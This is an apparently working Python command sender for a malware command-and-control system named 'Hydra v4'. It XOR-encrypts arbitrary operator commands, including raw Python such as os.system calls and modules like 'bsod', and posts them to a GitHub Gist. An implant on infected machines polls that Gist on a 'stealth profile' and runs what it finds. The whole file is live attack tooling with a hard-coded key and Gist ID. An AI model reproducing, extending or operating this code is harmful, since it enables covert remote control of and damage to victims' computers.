#!/usr/bin/env python3
"""
Hydra v4 — Quick C2 command sender.
XOR-encodes a command with the C2 key and pushes it to the Gist.
No more manual encoding + copy-paste bullshit.

Usage:
    python send_cmd.py "execute_module('bsod')"
    python send_cmd.py "execute_module('popup', ['Hydra', 'hello'])"
    python send_cmd.py --interactive
    python send_cmd.py --raw "import os; os.system('calc')"

The implant picks it up within 25-55 seconds (stealth profile).
"""

import os
import sys
import json
import subprocess
import urllib.request
import ssl

import base64

C2_KEY = b"hydra_c2_key_v4"
GIST_ID = "1f0e405b0ca1f4dec525f10aa326575f"
GIST_FILE = "c2_command.txt"
_CTX = ssl._create_unverified_context()


def xor_crypt(data: bytes, key: bytes) -> bytes:
    """XOR encrypt/decrypt (symmetric — same as implant's c2.py)."""
    key = key * (len(data) // len(key) + 1)
    return bytes(a ^ b for a, b in zip(data, key[:len(data)]))


def encode_command(plaintext: str) -> str:
    """XOR-encrypt then base64-encode a command.
    Returns a base64 string that fits in a single Gist line."""
    data = plaintext.encode("utf-8")
    encrypted = xor_crypt(data, C2_KEY)
    return base64.b64encode(encrypted).decode("ascii")


def update_gist(content: str) -> bool:
    """Push content to the Gist via gh CLI."""
    tmp = os.path.join(os.environ.get("TEMP", "/tmp"), "hydra_c2_payload.txt")

    payload = json.dumps({
        "files": {
            GIST_FILE: {
                "content": content
            }
        }
    })

    with open(tmp, "w", encoding="utf-8") as f:
        f.write(payload)

    try:
        result = subprocess.run(
            ["gh", "api", f"gists/{GIST_ID}",
             "-X", "PATCH",
             "--input", tmp],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
            return True
        print(f"  gh api failed: {result.stderr[-200:]}")
        return False
    except Exception as e:
        print(f"  gh api error: {e}")
        return False


def send(plaintext: str):
    """Encode + send one command."""
    print(f"\n  Command : {plaintext}")

    # Encode: plaintext → XOR → base64
    encrypted = xor_crypt(plaintext.encode("utf-8"), C2_KEY)
    encoded_b64 = base64.b64encode(encrypted).decode("ascii")

    print(f"  Encoded : {len(encrypted)} bytes → {len(encoded_b64)} chars b64")
    print(f"  b64     : {encoded_b64}")

    # Push base64 string as single line in Gist
    if update_gist(encoded_b64):
        print(f"  Status  : SENT — gist updated")
        print(f"  Implant picks it up in 25-55s\n")
    else:
        print(f"  Status  : FAILED\n")


def verify():
    """Fetch current Gist content and decode it."""
    url = f"https://gist.githubusercontent.com/vLoon-jpg/{GIST_ID}/raw/{GIST_FILE}?t={int(__import__('time').time())}"
    try:
        req = urllib.request.Request(url, headers={
            "User-Agent": "Mozilla/5.0"
        })
        resp = urllib.request.urlopen(req, timeout=10, context=_CTX)
        raw_b64 = resp.read().decode("ascii").strip()

        print(f"  b64     : {raw_b64}")

        # Decode: base64 → XOR decrypt → UTF-8
        try:
            encrypted = base64.b64decode(raw_b64)
            decrypted = xor_crypt(encrypted, C2_KEY)
            print(f"  Decoded : {decrypted.decode('utf-8')}")
        except Exception as e:
            print(f"  Decode failed: {e}")
            print(f"  Raw hex : {raw_b64.encode().hex()}")

    except Exception as e:
        print(f"  Fetch failed: {e}")


def interactive():
    """Interactive mode — type commands, they get sent immediately."""
    print("Hydra v4 C2 — Interactive Mode")
    print("Type commands (Ctrl+C to exit)")
    print("Examples: execute_module('bsod'), execute_module('popup', ['Hi', 'yo'])")
    print("---")
    try:
        while True:
            cmd = input("> ").strip()
            if cmd:
                if cmd == "/verify":
                    verify()
                elif cmd == "/exit":
                    break
                else:
                    send(cmd)
    except (KeyboardInterrupt, EOFError):
        print("\nDone.")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "--interactive":
            interactive()
        elif sys.argv[1] == "--verify":
            verify()
        elif sys.argv[1] == "--raw" and len(sys.argv) > 2:
            send(sys.argv[2])
        else:
            # Join all args as the command
            send(" ".join(sys.argv[1:]))
    else:
        print(__doc__)
        print("Usage: python send_cmd.py <command>")
        print("       python send_cmd.py --interactive")
        print("       python send_cmd.py --verify")
